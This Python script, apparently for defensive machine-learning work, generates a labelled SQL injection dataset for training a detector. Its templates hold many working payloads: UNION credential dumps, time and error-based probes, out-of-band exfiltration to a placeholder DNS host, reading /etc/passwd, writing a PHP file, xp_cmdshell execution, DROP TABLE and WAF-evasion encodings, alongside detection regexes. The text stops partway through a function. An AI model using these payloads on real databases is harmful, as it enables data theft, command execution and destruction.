#!/usr/bin/env python3
"""
Generate a SQL injection dataset for Random Forest training.

Outputs:
  1. Raw text dataset:
     query,label,attack_type,source
  2. Numeric feature dataset:
     label,<hand-crafted numeric features...>
  3. Coverage report:
     attack_type,category,dialect,context,count,coverage_status

The script is meant for offline defensive ML experiments. It does not send any
payloads anywhere and does not need network access.
"""

from __future__ import annotations

import argparse
import csv
import json
import math
import random
import re
import string
import urllib.parse
from collections import Counter, defaultdict
from pathlib import Path
from typing import Dict, Iterable, List, Sequence, Tuple


Record = Tuple[str, int, str, str]


ATTACK_TAXONOMY = {
    # In-band SQL injection
    "union_null_projection": ("inband", "generic", "parameter"),
    "union_column_dump": ("inband", "generic", "parameter"),
    "union_order_by_probe": ("inband", "generic", "parameter"),
    "error_mysql_xml": ("inband_error", "mysql", "parameter"),
    "error_mysql_floor_rand": ("inband_error", "mysql", "parameter"),
    "error_postgres_cast": ("inband_error", "postgresql", "parameter"),
    "error_mssql_convert": ("inband_error", "mssql", "parameter"),
    "error_oracle_xml": ("inband_error", "oracle", "parameter"),
    # Inferential SQL injection
    "boolean_tautology": ("inferential_boolean", "generic", "parameter"),
    "boolean_false_condition": ("inferential_boolean", "generic", "parameter"),
    "boolean_substring_extraction": ("inferential_boolean", "generic", "parameter"),
    "boolean_exists_probe": ("inferential_boolean", "generic", "parameter"),
    "time_mysql_sleep": ("inferential_time", "mysql", "parameter"),
    "time_postgres_pg_sleep": ("inferential_time", "postgresql", "parameter"),
    "time_mssql_waitfor": ("inferential_time", "mssql", "parameter"),
    "time_oracle_dbms_lock": ("inferential_time", "oracle", "parameter"),
    "time_heavy_query": ("inferential_time", "generic", "parameter"),
    # Out-of-band and file interaction
    "oob_dns_mysql": ("out_of_band", "mysql", "parameter"),
    "oob_http_oracle": ("out_of_band", "oracle", "parameter"),
    "oob_mssql_unc": ("out_of_band", "mssql", "parameter"),
    "file_read_mysql": ("file_interaction", "mysql", "parameter"),
    "file_write_mysql": ("file_interaction", "mysql", "parameter"),
    # Stacked and destructive forms
    "stacked_ddl": ("stacked_queries", "generic", "parameter"),
    "stacked_dml": ("stacked_queries", "generic", "parameter"),
    "stacked_exec": ("stacked_queries", "mssql", "parameter"),
    "stacked_procedure": ("stacked_queries", "generic", "parameter"),
    # Common application contexts
    "auth_bypass_basic": ("auth_bypass", "generic", "login_form"),
    "auth_bypass_comment": ("auth_bypass", "generic", "login_form"),
    "numeric_context": ("context_breakout", "generic", "numeric_parameter"),
    "string_context": ("context_breakout", "generic", "string_parameter"),
    "like_search_context": ("context_breakout", "generic", "search_parameter"),
    "order_by_context": ("context_breakout", "generic", "sort_parameter"),
    "insert_context": ("context_breakout", "generic", "insert_form"),
    "update_context": ("context_breakout", "generic", "profile_form"),
    "json_body_context": ("transport_context", "generic", "json_body"),
    "xml_body_context": ("transport_context", "generic", "xml_body"),
    "cookie_context": ("transport_context", "generic", "cookie"),
    "header_context": ("transport_context", "generic", "http_header"),
    "path_context": ("transport_context", "generic", "url_path"),
    "graphql_context": ("transport_context", "generic", "graphql"),
    # Database-specific syntax
    "mysql_specific": ("dialect_specific", "mysql", "parameter"),
    "postgres_specific": ("dialect_specific", "postgresql", "parameter"),
    "mssql_specific": ("dialect_specific", "mssql", "parameter"),
    "oracle_specific": ("dialect_specific", "oracle", "parameter"),
    "sqlite_specific": ("dialect_specific", "sqlite", "parameter"),
    # Evasion and encoding
    "evasion_inline_comment": ("evasion", "generic", "parameter"),
    "evasion_version_comment": ("evasion", "mysql", "parameter"),
    "evasion_case_toggle": ("evasion", "generic", "parameter"),
    "evasion_whitespace": ("evasion", "generic", "parameter"),
    "evasion_url_encoding": ("evasion", "generic", "parameter"),
    "evasion_double_url_encoding": ("evasion", "generic", "parameter"),
    "evasion_hex_encoding": ("evasion", "generic", "parameter"),
    "evasion_char_concat": ("evasion", "generic", "parameter"),
    "evasion_wide_byte": ("evasion", "mysql", "parameter"),
    "evasion_null_byte": ("evasion", "generic", "parameter"),
    "evasion_operator_substitution": ("evasion", "generic", "parameter"),
    "evasion_keyword_split": ("evasion", "generic", "parameter"),
    # Less common but useful training classes
    "second_order": ("second_order", "generic", "stored_value"),
    "stored_procedure_injection": ("stored_procedure", "mssql", "parameter"),
    "comment_truncation": ("syntax_abuse", "generic", "parameter"),
    "limit_offset_context": ("syntax_abuse", "generic", "pagination_parameter"),
    "having_group_context": ("syntax_abuse", "generic", "aggregate_parameter"),
}

ATTACK_TYPES = list(ATTACK_TAXONOMY.keys())

SQL_KEYWORDS = [
    "select",
    "union",
    "from",
    "where",
    "and",
    "or",
    "insert",
    "update",
    "delete",
    "drop",
    "sleep",
    "benchmark",
    "waitfor",
    "delay",
    "extractvalue",
    "updatexml",
    "load_file",
    "outfile",
    "xp_cmdshell",
    "xp_dirtree",
    "pg_sleep",
    "dbms_lock",
    "utl_http",
    "utl_inaddr",
]

TABLES = [
    "users",
    "accounts",
    "orders",
    "products",
    "payments",
    "sessions",
    "logs",
    "customers",
    "admin",
    "members",
    "config",
]

COLUMNS = [
    "id",
    "username",
    "password",
    "email",
    "token",
    "role",
    "price",
    "name",
    "created_at",
    "status",
    "version",
]

WORDS = [
    "alpha",
    "blue",
    "coffee",
    "delta",
    "east",
    "feature",
    "garden",
    "hotel",
    "invoice",
    "jacket",
    "kernel",
    "login",
    "market",
    "normal",
    "orange",
    "portal",
    "quick",
    "report",
    "search",
    "ticket",
    "update",
    "value",
    "window",
    "yellow",
]


CLASSIFIERS = [
    ("time_blind", re.compile(r"(?i)(sleep\s*\(|pg_sleep|waitfor\s+delay|benchmark\s*\(|dbms_lock\.sleep)")),
    ("union_based", re.compile(r"(?i)\bunion\b\s+(?:all\s+)?\bselect\b")),
    ("error_based", re.compile(r"(?i)(extractvalue|updatexml|floor\s*\(\s*rand|ctxsys\.drithsx|gtid_subset|xmltype)")),
    ("stacked_queries", re.compile(r"(?i);\s*(select|insert|update|delete|drop|exec|declare|call|begin|create|alter|truncate)")),
    ("oob", re.compile(r"(?i)(load_file|utl_inaddr|utl_http|dnslog|xp_dirtree|into\s+outfile|xp_cmdshell|\\\\)")),
    ("auth_bypass", re.compile(r"(?i)('|%27|\")\s*(or|\|\|)\s*('|%27)?\s*1\s*(=|like)\s*('|%27)?\s*1")),
    ("waf_evasion", re.compile(r"(?i)(/\*|%[0-9a-f]{2}|0x[0-9a-f]+|%df|%81|%aa|%c0|%09|%0a|%0d)")),
    ("json_context", re.compile(r"^\s*[\{\[]")),
]


def random_word(rng: random.Random) -> str:
    return rng.choice(WORDS)


def random_ident(rng: random.Random, values: Sequence[str]) -> str:
    return rng.choice(values)


def random_string(rng: random.Random, min_len: int = 4, max_len: int = 12) -> str:
    alphabet = string.ascii_lowercase + string.digits
    size = rng.randint(min_len, max_len)
    return "".join(rng.choice(alphabet) for _ in range(size))


def random_case(text: str, rng: random.Random) -> str:
    return "".join(ch.upper() if rng.random() < 0.45 else ch.lower() for ch in text)


def wrap_as_param(payload: str, rng: random.Random) -> str:
    keys = ["id", "q", "search", "user", "uid", "category", "page", "sort"]
    paths = ["index.php", "search.php", "api/items", "product", "login", "report"]
    return f"{rng.choice(paths)}?{rng.choice(keys)}={payload}&ref={random_word(rng)}"


def wrap_as_json(payload: str, rng: random.Random) -> str:
    key = rng.choice(["id", "username", "search", "filter", "token", "query", "email"])
    shapes = [
        {key: payload},
        {"data": {key: payload}},
        {"filters": [{"field": key, "value": payload}]},
        {"where": {key: payload, "active": True}},
    ]
    return json.dumps(rng.choice(shapes), ensure_ascii=False)


def mutate_payload(payload: str, rng: random.Random) -> str:
    """Apply one or more common encoding/context mutations."""
    result = payload
    transforms = [
        "case",
        "comment_space",
        "url",
        "double_url",
        "json",
        "param",
        "tab_space",
        "paren",
        "mysql_version_comment",
        "wide_byte",
    ]
    for name in rng.sample(transforms, rng.randint(1, 3)):
        if name == "case":
            result = random_case(result, rng)
        elif name == "comment_space" and " " in result:
            result = result.replace(" ", rng.choice(["/**/", "/*%00*/", "/*!*/", "/*!50000*/"]))
        elif name == "url":
            result = urllib.parse.quote(result, safe="")
        elif name == "double_url":
            result = urllib.parse.quote(urllib.parse.quote(result, safe=""), safe="")
        elif name == "json":
            result = wrap_as_json(result, rng)
        elif name == "param":
            result = wrap_as_param(result, rng)
        elif name == "tab_space" and " " in result:
            result = result.replace(" ", rng.choice(["%09", "%0a", "%0b", "%0c", "%0d", "%a0"]))
        elif name == "paren":
            result = f"({result})"
        elif name == "mysql_version_comment":
            result = re.sub(r"(?i)\bselect\b", "/*!50000SELECT*/", result)
            result = re.sub(r"(?i)\bunion\b", "/*!50000UNION*/", result)
        elif name == "wide_byte":
            result = result.replace("'", rng.choice(["%df'", "%81'", "%aa'", "%c0'"]))
    return result


def base_attack_payloads(attack_type: str, rng: random.Random) -> List[str]:
    table = random_ident(rng, TABLES)
    col = random_ident(rng, COLUMNS)
    col2 = random_ident(rng, COLUMNS)
    col3 = random_ident(rng, COLUMNS)
    n = rng.randint(1, 99999)
    sleep_time = rng.randint(2, 15)
    cols = ",".join(rng.choice(["NULL", str(rng.randint(1, 999)), "@@version", "user()", "database()"]) for _ in range(rng.randint(2, 6)))
    host = f"{random_string(rng, 5, 9)}.dnslog.test"
    word = random_word(rng)
    word2 = random_word(rng)
    token = random_string(rng)
    hex_word = "0x" + "".join(f"{ord(ch):02x}" for ch in word)
    char_codes = ",".join(str(ord(ch)) for ch in word[:5])

    templates: Dict[str, List[str]] = {
        "union_null_projection": [
            f"{n}' UNION SELECT {cols}--",
            f"{n}) UNION ALL SELECT {cols}#",
            f"-{n} UNION SELECT NULL,NULL,NULL",
            f"{n}' UNION SELECT NULL,@@version,database(),user()--",
        ],
        "union_column_dump": [
            f"' UNION SELECT {col},{col2} FROM {table}--",
            f"0 UNION SELECT username,password FROM {table}",
            f"-1' UNION SELECT NULL,CONCAT({col},0x3a,{col2}) FROM {table}--",
            f"{n}' UNION ALL SELECT {col},{col2},{col3} FROM {table} WHERE {col} IS NOT NULL--",
        ],
        "union_order_by_probe": [
            f"{n}' ORDER BY {rng.randint(1, 12)}--",
            f"{n}) ORDER BY {rng.randint(1, 12)}#",
            f"{n}' GROUP BY {rng.randint(1, 8)} HAVING 1=1--",
            f"{n}' UNION SELECT {','.join(str(i) for i in range(1, rng.randint(3, 8)))}--",
        ],
        "error_mysql_xml": [
            f"{n}' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--",
            f"{n}' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--",
            f"{n}' AND updatexml(null,concat(0x3a,user()),null)--",
        ],
        "error_mysql_floor_rand": [
            f"{n}' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            f"{n}' AND gtid_subset(concat(0x7e,(select user()),0x7e),1)--",
            f"{n}' AND exp(~(SELECT * FROM (SELECT user())x))--",
        ],
        "error_postgres_cast": [
            f"{n}' AND CAST((SELECT version()) AS int)>0--",
            f"{n}' AND 1=CAST((SELECT current_database()) AS integer)--",
            f"{n}' AND to_number((SELECT usename FROM pg_user LIMIT 1),'999')=1--",
        ],
        "error_mssql_convert": [
            f"{n}' AND 1=CONVERT(int,(SELECT @@version))--",
            f"{n}' AND 1=CAST((SELECT DB_NAME()) AS int)--",
            f"{n}' AND 1 IN (SELECT CONVERT(int,name) FROM sys.databases)--",
        ],
        "error_oracle_xml": [
            f"{n}' AND ctxsys.drithsx.sn(1,(SELECT user FROM dual))=1--",
            f"{n}' AND 1=utl_inaddr.get_host_address((SELECT user FROM dual))--",
            f"{n}' AND XMLType('<x>'||(SELECT user FROM dual)||'</x>') IS NOT NULL--",
        ],
        "boolean_tautology": [
            f"{n}' AND 1=1--",
            f"{n}' OR '{random_word(rng)}'='{random_word(rng)}'--",
            f"{n}) OR ({rng.randint(1, 9)}={rng.randint(1, 9)})--",
        ],
        "boolean_false_condition": [
            f"{n}' AND 1=2--",
            f"{n}' AND '{word}'='{word2}'--",
            f"{n}) AND ({rng.randint(10, 99)}<{rng.randint(1, 9)})--",
        ],
        "boolean_substring_extraction": [
            f"{n}' AND ASCII(SUBSTRING((SELECT password FROM {table} LIMIT 1),1,1))>{rng.randint(50, 100)}--",
            f"{n}' AND SUBSTR((SELECT user()),1,1)='{word[0]}'--",
            f"{n}' AND MID((SELECT database()),{rng.randint(1, 4)},1)>'m'--",
        ],
        "boolean_exists_probe": [
            f"{n}' AND EXISTS(SELECT 1 FROM {table} WHERE {col} LIKE 'a%')--",
            f"{n}' AND (SELECT COUNT(*) FROM {table})>{rng.randint(0, 10)}--",
            f"{n}' AND NOT EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name='{table}')--",
        ],
        "time_mysql_sleep": [
            f"{n}' AND SLEEP({sleep_time})--",
            f"{n}' OR IF(1=1,SLEEP({sleep_time}),0)--",
            f"{n}' AND IF(ASCII(SUBSTR(database(),1,1))>{rng.randint(60, 120)},SLEEP({sleep_time}),0)--",
        ],
        "time_postgres_pg_sleep": [
            f"{n}' AND pg_sleep({sleep_time})--",
            f"{n}'; SELECT pg_sleep({sleep_time})--",
            f"{n}' OR (SELECT CASE WHEN (1=1) THEN pg_sleep({sleep_time}) ELSE pg_sleep(0) END) IS NULL--",
        ],
        "time_mssql_waitfor": [
            f"{n}'; WAITFOR DELAY '0:0:{sleep_time}'--",
            f"{n}' IF (1=1) WAITFOR DELAY '0:0:{sleep_time}'--",
            f"{n}'; DECLARE @x CHAR(8); SET @x='0:0:{sleep_time}'; WAITFOR DELAY @x--",
        ],
        "time_oracle_dbms_lock": [
            f"{n}' AND dbms_lock.sleep({sleep_time}) IS NULL--",
            f"{n}' AND 1=(CASE WHEN 1=1 THEN dbms_pipe.receive_message('a',{sleep_time}) ELSE 1 END)--",
            f"{n}' AND dbms_session.sleep({sleep_time}) IS NULL--",
        ],
        "time_heavy_query": [
            f"{n}' AND benchmark({rng.randint(100000, 900000)},md5(1))--",
            f"{n}' AND (SELECT COUNT(*) FROM information_schema.columns a, information_schema.columns b)>0--",
            f"{n}' AND randomblob({rng.randint(100000, 900000)}) IS NOT NULL--",
        ],
        "oob_dns_mysql": [
            f"{n}' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.{host}\\\\a'))--",
            f"{n}' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT database()),'.{host}\\\\x')) IS NULL--",
            f"{n}' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',user(),'.{host}\\\\a'))--",
        ],
        "oob_http_oracle": [
            f"{n}' AND UTL_HTTP.REQUEST('http://{host}/'||(SELECT user FROM dual)) IS NOT NULL--",
            f"{n}' AND HTTPURITYPE('http://{host}/'||(SELECT banner FROM v$version WHERE rownum=1)).getclob() IS NOT NULL--",
            f"{n}' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.{host}') IS NOT NULL--",
        ],
        "oob_mssql_unc": [
            f"{n}'; EXEC master..xp_dirtree '\\\\\\\\{host}\\\\a'--",
            f"{n}'; EXEC master..xp_fileexist '\\\\\\\\{host}\\\\share\\\\x'--",
            f"{n}' UNION SELECT 1 FROM OPENROWSET('SQLNCLI','Server=\\\\\\\\{host};Trusted_Connection=yes;','SELECT 1')--",
        ],
        "file_read_mysql": [
            f"{n}' UNION SELECT LOAD_FILE('/etc/passwd')--",
            f"{n}' AND LOAD_FILE('/var/www/html/config.php') IS NOT NULL--",
            f"{n}' UNION SELECT LOAD_FILE(0x2f6574632f706173737764)--",
        ],
        "file_write_mysql": [
            f"{n}' UNION SELECT '{token}' INTO OUTFILE '/tmp/{token}.txt'--",
            f"{n}' UNION SELECT '<?php echo 1;?>' INTO DUMPFILE '/tmp/{token}.php'--",
            f"{n}' OR 1=1 INTO OUTFILE '\\\\\\\\{host}\\\\share\\\\dump.txt'--",
        ],
        "stacked_ddl": [
            f"{n}'; DROP TABLE {table}--",
            f"{n}'; ALTER TABLE {table} ADD COLUMN {token} INT--",
            f"{n}'; CREATE TABLE {token}(id INT)--",
        ],
        "stacked_dml": [
            f"{n}'; UPDATE {table} SET {col}='{random_string(rng)}' WHERE id={rng.randint(1, 50)}--",
            f"{n}'; INSERT INTO logs(message) VALUES('audit')--",
            f"{n}'; DELETE FROM {table} WHERE id={rng.randint(1, 50)}--",
        ],
        "stacked_exec": [
            f"{n}'; EXEC master..xp_cmdshell 'whoami'--",
            f"{n}'; EXEC sp_configure 'show advanced options',1--",
            f"{n}'; EXEC('SELECT @@version')--",
        ],
        "stacked_procedure": [
            f"{n}'; DECLARE @x CHAR(9); SET @x='0:0:{sleep_time}'; WAITFOR DELAY @x--",
            f"{n}'; CALL pg_sleep({sleep_time})--",
            f"{n}'; BEGIN EXECUTE IMMEDIATE 'select user from dual'; END;--",
        ],
        "auth_bypass_basic": [
            "' OR '1'='1'--",
            "\" OR \"1\"=\"1\"--",
            "') OR ('1'='1",
            f"{random_word(rng)}' OR '{random_word(rng)}' LIKE '{random_word(rng)}%'--",
        ],
        "auth_bypass_comment": [
            "admin'--",
            "' OR 1=1#",
            "' OR 'a'='a'/*",
            "\") OR 1=1--",
        ],
        "numeric_context": [
            f"{n} OR 1=1",
            f"{n}) OR ({n}={n}",
            f"-{n} UNION SELECT {cols}",
            f"{n} AND ASCII(SUBSTR(user(),1,1))>{rng.randint(50, 100)}",
        ],
        "string_context": [
            f"{word}' OR '1'='1",
            f"{word}' AND '{word}'='{word}",
            f"{word}' UNION SELECT {cols}--",
            f"{word}\\' OR 1=1--",
        ],
        "like_search_context": [
            "%' OR 1=1--",
            f"{word}%' UNION SELECT {cols}--",
            f"%') OR ({col} LIKE '%",
            f"{word}%' AND SLEEP({sleep_time})--",
        ],
        "order_by_context": [
            f"{col} DESC,(SELECT CASE WHEN 1=1 THEN 1 ELSE 1/0 END)",
            f"{rng.randint(1, 8)}; SELECT pg_sleep({sleep_time})--",
            f"{col} COLLATE utf8_general_ci,(SELECT SLEEP({sleep_time}))",
            f"{col} ASC--",
        ],
        "insert_context": [
            f"{word}'); INSERT INTO {table}({col}) VALUES('{token}')--",
            f"{word}'),('{token}','admin')--",
            f"{word}'); SELECT SLEEP({sleep_time})--",
        ],
        "update_context": [
            f"{word}', role='admin' WHERE username='{word2}'--",
            f"{word}', password='{token}' WHERE id={rng.randint(1, 50)}--",
            f"{word}' WHERE id={n}; UPDATE {table} SET {col}='{token}'--",
        ],
        "json_body_context": [
            wrap_as_json(f"{n}' OR 1=1--", rng),
            wrap_as_json(f"{n}' UNION SELECT {cols}--", rng),
            wrap_as_json(f"{n}' AND SLEEP({sleep_time})--", rng),
            json.dumps({"username": "admin'--", "password": random_string(rng)}),
        ],
        "xml_body_context": [
            f"<user><id>{n}' OR 1=1--</id></user>",
            f"<search>{word}' UNION SELECT {cols}--</search>",
            f"<filter field=\"id\">{n}' AND SLEEP({sleep_time})--</filter>",
        ],
        "cookie_context": [
            f"session={token}; uid={n}' OR 1=1--",
            f"tracking={word}' UNION SELECT {cols}--",
            f"cart={n}' AND pg_sleep({sleep_time})--",
        ],
        "header_context": [
            "X-Forwarded-For: 127.0.0.1' OR 1=1--",
            f"User-Agent: {word}' UNION SELECT {cols}--",
            f"Referer: http://example.test/{word}' AND SLEEP({sleep_time})--",
        ],
        "path_context": [
            f"/product/{n}' OR 1=1--",
            f"/api/{table}/{n}/UNION/SELECT/{cols}",
            f"/report/{word}%27%20AND%20SLEEP({sleep_time})--",
        ],
        "graphql_context": [
            json.dumps({"query": f"{{ user(id: \"{n}' OR 1=1--\") {{ id name }} }}"}),
            json.dumps({"query": f"query {{ search(q: \"{word}' UNION SELECT {cols}--\") {{ id }} }}"}),
            json.dumps({"variables": {"id": f"{n}' AND pg_sleep({sleep_time})--"}}),
        ],
        "mysql_specific": [
            f"{n}' AND @@version LIKE '%MariaDB%'--",
            f"{n}' UNION SELECT table_name FROM information_schema.tables--",
            f"{n}' AND user() LIKE '%@%'--",
        ],
        "postgres_specific": [
            f"{n}' UNION SELECT current_database(),current_user--",
            f"{n}' AND version() LIKE 'PostgreSQL%'--",
            f"{n}' AND (SELECT datname FROM pg_database LIMIT 1) IS NOT NULL--",
        ],
        "mssql_specific": [
            f"{n}' UNION SELECT @@version,DB_NAME()--",
            f"{n}' AND SYSTEM_USER IS NOT NULL--",
            f"{n}' AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--",
        ],
        "oracle_specific": [
            f"{n}' UNION SELECT banner,NULL FROM v$version--",
            f"{n}' AND user IS NOT NULL FROM dual--",
            f"{n}' AND (SELECT table_name FROM all_tables WHERE rownum=1) IS NOT NULL--",
        ],
        "sqlite_specific": [
            f"{n}' UNION SELECT sqlite_version(),NULL--",
            f"{n}' UNION SELECT name,sql FROM sqlite_master--",
            f"{n}' AND (SELECT COUNT(*) FROM sqlite_master)>0--",
        ],
        "evasion_inline_comment": [
            f"{n}'/**/UNION/**/SELECT/**/{cols}--",
            f"{n}'/**/OR/**/1=1--",
            f"{n}'/**/AND/**/SLEEP({sleep_time})--",
        ],
        "evasion_version_comment": [
            f"{n}' /*!50000UNION*/ /*!50000SELECT*/ {cols}--",
            f"{n}' /*!12345OR*/ 1=1--",
            f"{n}' /*!50000AND*/ SLEEP({sleep_time})--",
        ],
        "evasion_case_toggle": [
            random_case(f"{n}' union select {cols}--", rng),
            random_case(f"{n}' or 1=1--", rng),
            random_case(f"{n}' and sleep({sleep_time})--", rng),
        ],
        "evasion_whitespace": [
            f"{n}'%09OR%091=1%23",
            f"{n}'%0aUNION%0aSELECT%0a{urllib.parse.quote(cols)}--",
            f"{n}'%0dAND%0dSLEEP({sleep_time})--",
        ],
        "evasion_url_encoding": [
            urllib.parse.quote(f"{n}' OR 1=1--", safe=""),
            urllib.parse.quote(f"{n}' UNION SELECT {cols}--", safe=""),
            urllib.parse.quote(f"{n}' AND SLEEP({sleep_time})--", safe=""),
        ],
        "evasion_double_url_encoding": [
            urllib.parse.quote(urllib.parse.quote(f"{n}' OR 1=1--", safe=""), safe=""),
            urllib.parse.quote(urllib.parse.quote(f"{n}' UNION SELECT {cols}--", safe=""), safe=""),
            urllib.parse.quote(urllib.parse.quote(f"{n}' AND SLEEP({sleep_time})--", safe=""), safe=""),
        ],
        "evasion_hex_encoding": [
            f"{n}' OR {col}={hex_word}--",
            f"{n}' UNION SELECT {hex_word},0x3a,user()--",
            f"{n}' AND CONCAT({hex_word},0x2d,user()) IS NOT NULL--",
        ],
        "evasion_char_concat": [
            f"{n}' OR {col}=CHAR({char_codes})--",
            f"{n}' UNION SELECT CONCAT(CHAR({char_codes}),user())--",
            f"{n}' AND CHR({ord(word[0])})=SUBSTR(user(),1,1)--",
        ],
        "evasion_wide_byte": [
            f"{n}%df' OR 1=1--",
            f"{n}%aa' UNION SELECT {cols}--",
            f"{n}%c0' AND SLEEP({sleep_time})--",
        ],
        "evasion_null_byte": [
            f"{n}%00' OR 1=1--",
            f"{n}'%00 UNION SELECT {cols}--",
            f"{n}' AND SLEEP({sleep_time})%00--",
        ],
        "evasion_operator_substitution": [
            f"{n}' || 1 LIKE 1--",
            f"{n}' && ASCII(SUBSTR(user(),1,1))>{rng.randint(60, 120)}--",
            f"{n}' OR {rng.randint(1, 9)} BETWEEN 1 AND 9--",
            f"{n}' OR {rng.randint(1, 9)} IN ({rng.randint(1, 9)},{rng.randint(10, 20)})--",
        ],
        "evasion_keyword_split": [
            f"{n}' UN/**/ION SEL/**/ECT {cols}--",
            f"{n}' O/**/R 1=1--",
            f"{n}' A/**/ND SLEEP({sleep_time})--",
        ],
        "second_order": [
            f"{random_word(rng)}'); UPDATE {table} SET role='admin' WHERE username='{random_word(rng)}'--",
            f"{random_word(rng)}'; INSERT INTO {table}({col}) VALUES('{random_string(rng)}')--",
            f"{random_word(rng)}'||(SELECT password FROM {table} LIMIT 1)||'",
            f"{random_word(rng)}'); SELECT pg_sleep({sleep_time})--",
            f"{random_word(rng)}\\'; DROP TABLE {table};--",
        ],
        "stored_procedure_injection": [
            f"{n}'; EXEC sp_executesql N'SELECT * FROM {table}'--",
            f"{n}'; EXEC xp_cmdshell 'whoami'--",
            f"{n}'; EXEC dbo.searchUsers '{word}'' OR 1=1--'--",
        ],
        "comment_truncation": [
            f"{word}'--",
            f"{word}'#",
            f"{word}'/*",
            f"{n}' OR 1=1-- trailing",
        ],
        "limit_offset_context": [
            f"{rng.randint(1, 100)} UNION SELECT {cols}",
            f"{rng.randint(1, 100)} OFFSET 0; SELECT SLEEP({sleep_time})--",
            f"{rng.randint(1, 100)} ROWS FETCH NEXT 1 ROWS ONLY; DROP TABLE {table}--",
        ],
        "having_group_context": [
            f"{col} HAVING 1=1--",
            f"{col} HAVING COUNT(*)>{rng.randint(0, 10)}--",
            f"{col} GROUP BY {col} HAVING SLEEP({sleep_time})--",
        ],
    }
    if attack_type not in templates:
        raise KeyError(f"No payload templates registered for attack type: {attack_type}")
    return templates[attack_type]


def generate_attacks(per_type: int, rng: random.Random) -> List[Record]:
    records: List[Record] = []
    seen = set()
    for attack_type in ATTACK_TYPES:
        attempts = 0
        while len([r for r in records if r[2] == attack_type]) < per_type:
            attempts += 1
            if attempts > per_type * 80:
                raise RuntimeError(f"Unable to generate enough unique samples for {attack_type}")
            payload = rng.choice(base_attack_payloads(attack_type, rng))
            if rng.random() < 0.72:
                payload = mutate_payload(payload, rng)
            if payload in seen:
                continue
            seen.add(payload)
            records.append((payload, 1, attack_type, "synthetic"))
    return records


def generate_benign(count: int, rng: random.Random) -> List[Record]:
    records: List[Record] = []
    seen = set()
    while len(records) < count:
        table = random_ident(rng, TABLES)
        col = random_ident(rng, COLUMNS)
        col2 = random_ident(rng, COLUMNS)
        word = random_word(rng)
        n = rng.randint(1, 100000)
        benign_templates = [
            f"index.php?id={n}&ref={word}",
            f"search.php?q={urllib.parse.quote(word)}&page={rng.randint(1, 20)}",
            f"api/items?category={word}&sort={rng.choice(['name', 'price', 'date'])}",
            f"/login?username={word}&remember={rng.choice(['true', 'false'])}",
            f"SELECT {col},{col2} FROM {table} WHERE id={n}",
            f"SELECT * FROM {table} WHERE {col}='{word}'",
            f"SELECT {col} FROM {table} ORDER BY {col2} LIMIT {rng.randint(5, 100)}",
            f"SELECT '{word}' AS label, {col} FROM {table}",
            json.dumps({"id": n, "search": word, "active": rng.choice([True, False])}),
            json.dumps({"data": {"username": word, "token": random_string(rng, 12, 24)}}),
            urllib.parse.quote(f"{word} {random_word(rng)} {n}"),
            f"{word}-{random_string(rng)}",
            f"{n}",
            f"{word}@example.com",
        ]
        text = rng.choice(benign_templates)
        if rng.random() < 0.18:
            text = wrap_as_param(text, rng)
        if text in seen:
            continue
        seen.add(text)
        records.append((text, 0, "benign", "synthetic"))
    return records


def clean_label(value: str) -> int | None:
    v = str(value).strip().lower()
    if v in {"1", "1.0", "true", "malicious", "sqli", "sql injection"}:
        return 1
    if v in {"0", "0.0", "false", "benign", "normal"}:
        return 0
    return None


def classify_attack(text: str, label: int) -> str:
    if label == 0:
        return "benign"
    for name, pattern in CLASSIFIERS:
        if pattern.search(text):
            return name
    return "sqli_other"


def read_existing_csv(path: Path) -> List[Record]:
    records: List[Record] = []
    with path.open("r", encoding="utf-8-sig", newline="", errors="replace") as f:
        reader = csv.DictReader(f)
        if not reader.fieldnames:
            return records
        fields = {name.lower().strip(): name for name in reader.fieldnames}
        query_col = None
        for candidate in ["query", "uri_without_url_encoded", "sentence", "payload", "text"]:
            if candidate in fields:
                query_col = fields[candidate]
                break
        label_col = None
        for candidate in ["label", "lable", "class", "target"]:
            if candidate in fields:
                label_col = fields[candidate]
                break
        if query_col is None or label_col is None:
            return records
        for row in reader:
            query = str(row.get(query_col, "")).strip()
            label = clean_label(row.get(label_col, ""))
            if not query or label is None:
                continue
            records.append((query, label, classify_attack(query, label), path.name))
    return records


def read_existing_txt(path: Path, label: int = 1) -> List[Record]:
    records: List[Record] = []
    with path.open("r", encoding="utf-8", errors="replace") as f:
        for line in f:
            query = line.strip()
            if query:
                records.append((query, label, classify_attack(query, label), path.name))
    return records


def sample_existing(records: List[Record], cap_per_label: int, rng: random.Random) -> List[Record]:
    if cap_per_label <= 0:
        return records
    grouped: Dict[int, List[Record]] = defaultdict(list)
    for record in records:
        grouped[record[1]].append(record)
    sampled: List[Record] = []
    for label, items in grouped.items():
        if len(items) <= cap_per_label:
            sampled.extend(items)
        else:
            sampled.extend(rng.sample(items, cap_per_label))
    return sampled


def load_existing(root: Path, cap_per_label: int, rng: random.Random) -> List[Record]:
    csv_names = [
        "total_training_dataset_v4_pinnacle.csv",
        "total_training_dataset_v3_ultimate.csv",
        "total_training_dataset_enhanced.csv",
        "total_training_dataset.csv",
        "kaggle_cleaned_final.csv",
        "Modified_SQL_Dataset.csv",
        "sqlmap.csv",
    ]
    txt_names = ["sqlmap.txt", "whsql.txt", "whspl.txt"]

    records: List[Record] = []
    for name in csv_names:
        path = root / name
        if path.exists():
            records.extend(read_existing_csv(path))
    for name in txt_names:
        path = root / name
        if path.exists():
            records.extend(read_existing_txt(path, label=1))
    return sample_existing(records, cap_per_label, rng)


def dedupe_records(records: Iterable[Record], prefer_synthetic: bool = False) -> List[Record]:
    by_query: Dict[str, Record] = {}
    conflicts = 0
    for query, label, attack_type, source in records:
        key = query.strip()
        if not key:
            continue
        existing = by_query.get(key)
        if existing is None:
            by_query[key] = (key, label, attack_type, source)
            continue
        if existing[1] != label:
            conflicts += 1
            continue
        if prefer_synthetic and existing[3] != "synthetic" and source == "synthetic":
            by_query[key] = (key, label, attack_type, source)
    if conflicts:
        print(f"Skipped {conflicts} duplicate queries with conflicting labels.")
    return list(by_query.values())


def shannon_entropy(text: str) -> float:
    if not text:
        return 0.0
